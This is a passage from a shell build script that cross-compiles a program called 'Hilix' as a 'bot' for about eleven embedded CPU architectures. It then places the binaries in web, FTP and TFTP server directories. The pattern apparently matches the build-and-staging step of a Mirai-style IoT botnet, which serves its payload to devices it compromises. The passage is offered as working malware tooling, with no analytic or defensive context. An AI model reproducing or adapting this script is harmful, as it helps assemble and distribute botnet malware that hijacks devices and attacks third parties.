...
compile_bot i586 Hilix.x86 "-static"
compile_bot mips Hilix.mips "-static"
compile_bot mipsel Hilix.mpsl "-static"
compile_bot armv4l Hilix.arm "-static"
compile_bot armv5l Hilix.arm5 ""
compile_bot armv6l Hilix.arm6 "-static"
compile_bot armv7l Hilix.arm7 "-static"
compile_bot powerpc Hilix.ppc "-static"
compile_bot sparc Hilix.spc "-static"
compile_bot m68k Hilix.m68k "-static"
compile_bot sh4 Hilix.sh4 "-static"

cp release/Hilix.* /var/www/html/bins
cp release/Hilix.* /var/ftp
mv release/Hilix.* /var/lib/tftpboot
rm -rf release
